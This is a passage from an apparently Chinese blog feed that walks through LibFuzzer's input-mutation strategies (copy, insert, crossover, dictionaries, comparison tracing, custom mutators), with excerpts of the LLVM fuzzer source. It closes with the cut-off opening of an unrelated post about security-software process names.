ChangeBinaryInteger&lt;<span class="keyword">uint16_t</span>&gt;(Data, Size, Rand);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">return</span> ChangeBinaryInteger&lt;<span class="keyword">uint8_t</span>&gt;(Data, Size, Rand);</span><br><span class="line">    <span class="keyword">default</span>: assert(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ChangeBinaryInteger</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size, Random &amp;Rand)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size &lt; <span class="keyword">sizeof</span>(T)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> Off = Rand(Size - <span class="keyword">sizeof</span>(T) + <span class="number">1</span>);</span><br><span class="line">  assert(Off + <span class="keyword">sizeof</span>(T) &lt;= Size);</span><br><span class="line">  T Val;</span><br><span class="line">  <span class="keyword">if</span> (Off &lt; <span class="number">64</span> &amp;&amp; !Rand(<span class="number">4</span>)) &#123;</span><br><span class="line">    Val = Size;</span><br><span class="line">    <span class="keyword">if</span> (Rand.RandBool())</span><br><span class="line">      Val = Bswap(Val);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;Val, Data + Off, <span class="keyword">sizeof</span>(Val));</span><br><span class="line">    T Add = Rand(<span class="number">21</span>);</span><br><span class="line">    Add -= <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (Rand.RandBool())</span><br><span class="line">      Val = Bswap(T(Bswap(Val) + Add)); <span class="comment">// Add assuming different endiannes.</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      Val = Val + Add;               <span class="comment">// Add assuming current endiannes.</span></span><br><span class="line">    <span class="keyword">if</span> (Add == <span class="number">0</span> || Rand.RandBool()) <span class="comment">// Maybe negate.</span></span><br><span class="line">      Val = -Val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(Data + Off, &amp;Val, <span class="keyword">sizeof</span>(Val));</span><br><span class="line">  <span class="keyword">return</span> Size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// compiler-rt/lib/fuzzer/FuzzerBuiltins.h</span></span><br><span class="line"><span class="comment">// GNU</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">uint8_t</span>  <span class="title">Bswap</span><span class="params">(<span class="keyword">uint8_t</span> x)</span>  </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">uint16_t</span> <span class="title">Bswap</span><span class="params">(<span class="keyword">uint16_t</span> x)</span> </span>&#123; <span class="keyword">return</span> __builtin_bswap16(x); &#125; <span class="comment">// 按字节顺序翻转，0xaabb -&gt; 0xbbaa</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">uint32_t</span> <span class="title">Bswap</span><span class="params">(<span class="keyword">uint32_t</span> x)</span> </span>&#123; <span class="keyword">return</span> __builtin_bswap32(x); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">uint64_t</span> <span class="title">Bswap</span><span class="params">(<span class="keyword">uint64_t</span> x)</span> </span>&#123; <span class="keyword">return</span> __builtin_bswap64(x); &#125;</span><br></pre></td></tr></table></figure>
<h2 id="CopyPart"><a href="#CopyPart" class="headerlink" title="CopyPart"></a>CopyPart</h2><p>随机选择<code>CopyPartOf</code>或<code>InsertPartOf</code>，<code>CopyPartOf</code>将<code>Data</code>中随机位置的随即长度的数据拷贝到该位置前的随机位置处进行覆写，<code>InsertPartOf</code>将<code>Data</code>中随机位置的随机长度的数据插入到随机位置中（<code>ToInsertPos</code>数据后移）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Overwrites part of To[0,ToSize) with a part of From[0,FromSize).</span></span><br><span class="line"><span class="comment">// Returns ToSize.</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::CopyPartOf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span> *From, <span class="keyword">size_t</span> FromSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      <span class="keyword">uint8_t</span> *To, <span class="keyword">size_t</span> ToSize)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Copy From[FromBeg, FromBeg + CopySize) into To[ToBeg, ToBeg + CopySize).</span></span><br><span class="line">  <span class="keyword">size_t</span> ToBeg = Rand(ToSize);</span><br><span class="line">  <span class="keyword">size_t</span> CopySize = Rand(ToSize - ToBeg) + <span class="number">1</span>;</span><br><span class="line">  assert(ToBeg + CopySize &lt;= ToSize);</span><br><span class="line">  CopySize = <span class="built_in">std</span>::min(CopySize, FromSize);</span><br><span class="line">  <span class="keyword">size_t</span> FromBeg = Rand(FromSize - CopySize + <span class="number">1</span>);</span><br><span class="line">  assert(FromBeg + CopySize &lt;= FromSize);</span><br><span class="line">  memmove(To + ToBeg, From + FromBeg, CopySize);</span><br><span class="line">  <span class="keyword">return</span> ToSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Inserts part of From[0,ToSize) into To.</span></span><br><span class="line"><span class="comment">// Returns new size of To on success or 0 on failure.</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::InsertPartOf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span> *From, <span class="keyword">size_t</span> FromSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">uint8_t</span> *To, <span class="keyword">size_t</span> ToSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">size_t</span> MaxToSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ToSize &gt;= MaxToSize) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> AvailableSpace = MaxToSize - ToSize;</span><br><span class="line">  <span class="keyword">size_t</span> MaxCopySize = <span class="built_in">std</span>::min(AvailableSpace, FromSize);</span><br><span class="line">  <span class="keyword">size_t</span> CopySize = Rand(MaxCopySize) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">size_t</span> FromBeg = Rand(FromSize - CopySize + <span class="number">1</span>);</span><br><span class="line">  assert(FromBeg + CopySize &lt;= FromSize);</span><br><span class="line">  <span class="keyword">size_t</span> ToInsertPos = Rand(ToSize + <span class="number">1</span>);</span><br><span class="line">  assert(ToInsertPos + CopySize &lt;= MaxToSize);</span><br><span class="line">  <span class="keyword">size_t</span> TailSize = ToSize - ToInsertPos;</span><br><span class="line">  <span class="keyword">if</span> (To == From) &#123;</span><br><span class="line">    MutateInPlaceHere.resize(MaxToSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(MutateInPlaceHere.data(), From + FromBeg, CopySize);</span><br><span class="line">    memmove(To + ToInsertPos + CopySize, To + ToInsertPos, TailSize);</span><br><span class="line">    memmove(To + ToInsertPos, MutateInPlaceHere.data(), CopySize);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    memmove(To + ToInsertPos + CopySize, To + ToInsertPos, TailSize);</span><br><span class="line">    memmove(To + ToInsertPos, From + FromBeg, CopySize);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ToSize + CopySize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_CopyPart</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                           <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size &gt; MaxSize || Size == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// If Size == MaxSize, `InsertPartOf(...)` will</span></span><br><span class="line">  <span class="comment">// fail so there&#x27;s no point using it in this case.</span></span><br><span class="line">  <span class="keyword">if</span> (Size == MaxSize || Rand.RandBool())</span><br><span class="line">    <span class="keyword">return</span> CopyPartOf(Data, Size, Data, Size);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> InsertPartOf(Data, Size, Data, Size, MaxSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CrossOver"><a href="#CrossOver" class="headerlink" title="CrossOver"></a>CrossOver</h2><p>从<code>CrossOver</code>、<code>InsertPartOf</code>和<code>CopyPartOf</code>中随机选择一种动作，其中<code>CrossOver</code>将<code>Data</code>和<code>CrossOverWith</code>中的数据以每次轮流取随机大小的块交叉排列组合在一起，<code>InsertPartOf</code>将<code>CrossOverWith</code>中随机位置处随机长度的数据插入到<code>Data</code>的随机位置处，<code>CopyPartOf</code>用<code>CrossOverWith</code>中随机位置处随机长度的数据对<code>Data</code>随机位置处的数据进行覆写。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_CrossOver</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size &gt; MaxSize) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (Size == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (!CrossOverWith) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> Unit &amp;O = *CrossOverWith;</span><br><span class="line">  <span class="keyword">if</span> (O.empty()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  MutateInPlaceHere.resize(MaxSize);</span><br><span class="line">  <span class="keyword">auto</span> &amp;U = MutateInPlaceHere;</span><br><span class="line">  <span class="keyword">size_t</span> NewSize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span>(Rand(<span class="number">3</span>)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      NewSize = CrossOver(Data, Size, O.data(), O.size(), U.data(), U.size());</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      NewSize = InsertPartOf(O.data(), O.size(), U.data(), U.size(), MaxSize);</span><br><span class="line">      <span class="keyword">if</span> (!NewSize)</span><br><span class="line">        NewSize = CopyPartOf(O.data(), O.size(), U.data(), U.size());</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      NewSize = CopyPartOf(O.data(), O.size(), U.data(), U.size());</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: assert(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  assert(NewSize &gt; <span class="number">0</span> &amp;&amp; <span class="string">&quot;CrossOver returned empty unit&quot;</span>);</span><br><span class="line">  assert(NewSize &lt;= MaxSize &amp;&amp; <span class="string">&quot;CrossOver returned overisized unit&quot;</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(Data, U.data(), NewSize);</span><br><span class="line">  <span class="keyword">return</span> NewSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// compiler-rt/lib/fuzzer/FuzzerLoop.cpp</span></span><br><span class="line"><span class="keyword">if</span> (Options.DoCrossOver)</span><br><span class="line">  MD.SetCrossOverWith(&amp;Corpus.ChooseUnitToMutate(MD.GetRand()).U);</span><br><span class="line"></span><br><span class="line"><span class="comment">// compiler-rt/lib/fuzzer/FuzzerMutate.h</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetCrossOverWith</span><span class="params">(<span class="keyword">const</span> Unit *U)</span> </span>&#123; CrossOverWith = U; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// llvm-project/compiler-rt/lib/fuzzer/FuzzerCrossOver.cpp</span></span><br><span class="line"><span class="comment">// Cross Data1 and Data2, store the result (up to MaxOutSize bytes) in Out.</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::CrossOver</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint8_t</span> *Data1, <span class="keyword">size_t</span> Size1,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">const</span> <span class="keyword">uint8_t</span> *Data2, <span class="keyword">size_t</span> Size2,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">uint8_t</span> *Out, <span class="keyword">size_t</span> MaxOutSize)</span> </span>&#123;</span><br><span class="line">  assert(Size1 || Size2);</span><br><span class="line">  MaxOutSize = Rand(MaxOutSize) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">size_t</span> OutPos = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> Pos1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> Pos2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> *InPos = &amp;Pos1;</span><br><span class="line">  <span class="keyword">size_t</span> InSize = Size1;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint8_t</span> *Data = Data1;</span><br><span class="line">  <span class="keyword">bool</span> CurrentlyUsingFirstData = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">while</span> (OutPos &lt; MaxOutSize &amp;&amp; (Pos1 &lt; Size1 || Pos2 &lt; Size2)) &#123;</span><br><span class="line">    <span class="comment">// Merge a part of Data into Out.</span></span><br><span class="line">    <span class="keyword">size_t</span> OutSizeLeft = MaxOutSize - OutPos;</span><br><span class="line">    <span class="keyword">if</span> (*InPos &lt; InSize) &#123;</span><br><span class="line">      <span class="keyword">size_t</span> InSizeLeft = InSize - *InPos;</span><br><span class="line">      <span class="keyword">size_t</span> MaxExtraSize = <span class="built_in">std</span>::min(OutSizeLeft, InSizeLeft);</span><br><span class="line">      <span class="keyword">size_t</span> ExtraSize = Rand(MaxExtraSize) + <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">memcpy</span>(Out + OutPos, Data + *InPos, ExtraSize);</span><br><span class="line">      OutPos += ExtraSize;</span><br><span class="line">      (*InPos) += ExtraSize;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Use the other input data on the next iteration.</span></span><br><span class="line">    InPos  = CurrentlyUsingFirstData ? &amp;Pos2 : &amp;Pos1;</span><br><span class="line">    InSize = CurrentlyUsingFirstData ? Size2 : Size1;</span><br><span class="line">    Data   = CurrentlyUsingFirstData ? Data2 : Data1;</span><br><span class="line">    CurrentlyUsingFirstData = !CurrentlyUsingFirstData;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> OutPos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ManualDict"><a href="#ManualDict" class="headerlink" title="ManualDict"></a>ManualDict</h2><p>在参数<code>-dict</code>指定的<code>ManualDictionary</code>中随机选择一个<code>Word</code>插入或覆写到<code>Data</code>的随机位置。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// compiler-rt/lib/fuzzer/FuzzerMutate.h</span></span><br><span class="line"><span class="comment">// Dictionary provided by the user via -dict=DICT_FILE.</span></span><br><span class="line">Dictionary ManualDictionary;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_AddWordFromManualDictionary</span><span class="params">(<span class="keyword">uint8_t</span> *Data,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                              <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                              <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> AddWordFromDictionary(ManualDictionary, Data, Size, MaxSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::AddWordFromDictionary</span><span class="params">(Dictionary &amp;D, <span class="keyword">uint8_t</span> *Data,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                 <span class="keyword">size_t</span> Size, <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size &gt; MaxSize) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (D.empty()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  DictionaryEntry &amp;DE = D[Rand(D.size())];</span><br><span class="line">  Size = ApplyDictionaryEntry(Data, Size, MaxSize, DE);</span><br><span class="line">  <span class="keyword">if</span> (!Size) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  DE.IncUseCount();</span><br><span class="line">  CurrentDictionaryEntrySequence.push_back(&amp;DE);</span><br><span class="line">  <span class="keyword">return</span> Size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::ApplyDictionaryEntry</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                <span class="keyword">size_t</span> MaxSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                DictionaryEntry &amp;DE)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> Word &amp;W = DE.GetW();</span><br><span class="line">  <span class="keyword">bool</span> UsePositionHint = DE.HasPositionHint() &amp;&amp;</span><br><span class="line">                         DE.GetPositionHint() + W.size() &lt; Size &amp;&amp;</span><br><span class="line">                         Rand.RandBool();</span><br><span class="line">  <span class="keyword">if</span> (Rand.RandBool()) &#123;  <span class="comment">// Insert W.</span></span><br><span class="line">    <span class="keyword">if</span> (Size + W.size() &gt; MaxSize) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> Idx = UsePositionHint ? DE.GetPositionHint() : Rand(Size + <span class="number">1</span>);</span><br><span class="line">    memmove(Data + Idx + W.size(), Data + Idx, Size - Idx);</span><br><span class="line">    <span class="built_in">memcpy</span>(Data + Idx, W.data(), W.size());</span><br><span class="line">    Size += W.size();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;  <span class="comment">// Overwrite some bytes with W.</span></span><br><span class="line">    <span class="keyword">if</span> (W.size() &gt; Size) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> Idx = UsePositionHint ? DE.GetPositionHint() : Rand(Size - W.size());</span><br><span class="line">    <span class="built_in">memcpy</span>(Data + Idx, W.data(), W.size());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="PersAutoDict"><a href="#PersAutoDict" class="headerlink" title="PersAutoDict"></a>PersAutoDict</h2><p>在<code>PersistentAutoDictionary</code>（运行过程中搜集有助于提升覆盖率的数据）中随机选择一个<code>Word</code>插入或覆写到<code>Data</code>的随机位置。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// compiler-rt/lib/fuzzer/FuzzerLoop.cpp</span></span><br><span class="line">Dictionary PersistentAutoDictionary;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_AddWordFromPersistentAutoDictionary</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size, <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> AddWordFromDictionary(PersistentAutoDictionary, Data, Size, MaxSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CMP"><a href="#CMP" class="headerlink" title="CMP"></a>CMP</h2><p><code>-fsanitize-coverage=trace-cmp (on by default as part of -fsanitize=fuzzer)</code></p>
<p>在<code>TableOfRecentCompares(TORC)</code>（运行过程中记录执行过的比较操作）中随机选择一个<code>Word</code>插入或覆写到<code>Data</code>的随机位置。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_AddWordFromTORC</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size, <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  Word W;</span><br><span class="line">  DictionaryEntry DE;</span><br><span class="line">  <span class="keyword">switch</span> (Rand(<span class="number">4</span>)) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line">    <span class="keyword">auto</span> X = TPC.TORC8.Get(Rand.Rand());</span><br><span class="line">    DE = MakeDictionaryEntryFromCMP(X.A, X.B, Data, Size);</span><br><span class="line">  &#125; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">    <span class="keyword">auto</span> X = TPC.TORC4.Get(Rand.Rand());</span><br><span class="line">    <span class="keyword">if</span> ((X.A &gt;&gt; <span class="number">16</span>) == <span class="number">0</span> &amp;&amp; (X.B &gt;&gt; <span class="number">16</span>) == <span class="number">0</span> &amp;&amp; Rand.RandBool())</span><br><span class="line">      DE = MakeDictionaryEntryFromCMP((<span class="keyword">uint16_t</span>)X.A, (<span class="keyword">uint16_t</span>)X.B, Data, Size);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      DE = MakeDictionaryEntryFromCMP(X.A, X.B, Data, Size);</span><br><span class="line">  &#125; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">    <span class="keyword">auto</span> X = TPC.TORCW.Get(Rand.Rand());</span><br><span class="line">    DE = MakeDictionaryEntryFromCMP(X.A, X.B, Data, Size);</span><br><span class="line">  &#125; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">if</span> (Options.UseMemmem) &#123;</span><br><span class="line">    <span class="keyword">auto</span> X = TPC.MMT.Get(Rand.Rand());</span><br><span class="line">    DE = DictionaryEntry(X);</span><br><span class="line">  &#125; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    assert(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!DE.GetW().size()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  Size = ApplyDictionaryEntry(Data, Size, MaxSize, DE);</span><br><span class="line">  <span class="keyword">if</span> (!Size) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  DictionaryEntry &amp;DERef =</span><br><span class="line">      CmpDictionaryEntriesDeque[CmpDictionaryEntriesDequeIdx++ %</span><br><span class="line">                                kCmpDictionaryEntriesDequeSize];</span><br><span class="line">  DERef = DE;</span><br><span class="line">  CurrentDictionaryEntrySequence.push_back(&amp;DERef);</span><br><span class="line">  <span class="keyword">return</span> Size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Custom"><a href="#Custom" class="headerlink" title="Custom"></a>Custom</h2><p>调用用户自定义实现的数据变异方法。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 用户定义方法接口，和LLVMFuzzerTestOneInput位于同一cpp中</span></span><br><span class="line"><span class="comment">// extern &quot;C&quot; size_t LLVMFuzzerCustomMutator</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_Custom</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                         <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> EF-&gt;LLVMFuzzerCustomMutator(Data, Size, MaxSize, Rand.Rand());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CustomCrossOver"><a href="#CustomCrossOver" class="headerlink" title="CustomCrossOver"></a>CustomCrossOver</h2><p>调用用户自定义实现的数据交叉方法。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::Mutate_CustomCrossOver</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                  <span class="keyword">size_t</span> MaxSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (Size == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (!CrossOverWith) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> Unit &amp;Other = *CrossOverWith;</span><br><span class="line">  <span class="keyword">if</span> (Other.empty())</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  CustomCrossOverInPlaceHere.resize(MaxSize);</span><br><span class="line">  <span class="keyword">auto</span> &amp;U = CustomCrossOverInPlaceHere;</span><br><span class="line">  <span class="keyword">size_t</span> NewSize = EF-&gt;LLVMFuzzerCustomCrossOver(</span><br><span class="line">      Data, Size, Other.data(), Other.size(), U.data(), U.size(), Rand.Rand());</span><br><span class="line">  <span class="keyword">if</span> (!NewSize)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  assert(NewSize &lt;= MaxSize &amp;&amp; <span class="string">&quot;CustomCrossOver returned overisized unit&quot;</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(Data, U.data(), NewSize);</span><br><span class="line">  <span class="keyword">return</span> NewSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="策略选择"><a href="#策略选择" class="headerlink" title="策略选择"></a>策略选择</h2><p><code>LibFuzzer</code>随机选择编译策略，其关键代码位于<code>515</code>行。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Mutates Data in place, returns new size.</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">MutationDispatcher::MutateImpl</span><span class="params">(<span class="keyword">uint8_t</span> *Data, <span class="keyword">size_t</span> Size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      <span class="keyword">size_t</span> MaxSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      Vector&lt;Mutator&gt; &amp;Mutators)</span> </span>&#123;</span><br><span class="line">  assert(MaxSize &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// Some mutations may fail (e.g. can&#x27;t insert more bytes if Size == MaxSize),</span></span><br><span class="line">  <span class="comment">// in which case they will return 0.</span></span><br><span class="line">  <span class="comment">// Try several times before returning un-mutated data.</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> Iter = <span class="number">0</span>; Iter &lt; <span class="number">100</span>; Iter++) &#123;</span><br><span class="line">    <span class="keyword">auto</span> M = Mutators[Rand(Mutators.size())]; <span class="comment">// 这里</span></span><br><span class="line">    <span class="keyword">size_t</span> NewSize = (<span class="keyword">this</span>-&gt;*(M.Fn))(Data, Size, MaxSize);</span><br><span class="line">    <span class="keyword">if</span> (NewSize &amp;&amp; NewSize &lt;= MaxSize) &#123;</span><br><span class="line">      <span class="keyword">if</span> (Options.OnlyASCII)</span><br><span class="line">        ToASCII(Data, NewSize);</span><br><span class="line">      CurrentMutatorSequence.push_back(M);</span><br><span class="line">      <span class="keyword">return</span> NewSize;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *Data = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;   <span class="comment">// Fallback, should not happen frequently.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>随机选择编译策略的方法明显有所不足，因此有学者对此进行了改进，比如<a href="https://arxiv.org/abs/1807.07490">FuzzerGym: A Competitive Framework for Fuzzing and Learning</a>，改论文采用强化学习（DQN）的方法来改进fuzz的效率，在此感谢Drozd教授的指导。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文总结介绍了<code>LibFuzzer</code>的变异策略，有助于我们对其进行进一步的改进。</p>
]]></content>
      <categories>
        <category>模糊测试</category>
      </categories>
      <tags>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>安全软件相关名称搜集</title>
    <url>/2019/10/10/%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E7%9B%B8%E5%85%B3%E5%90%8D%E7%A7%B0%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<p>安全软件相关名称搜集，包括进程名等。</p>
<span id="more"></span>
<h1 id="进程名"><a href="#进程名" class="headerlink" title="进程名"></a>进程名</h1><div class="table-container">
<table>
<thead>
<tr>
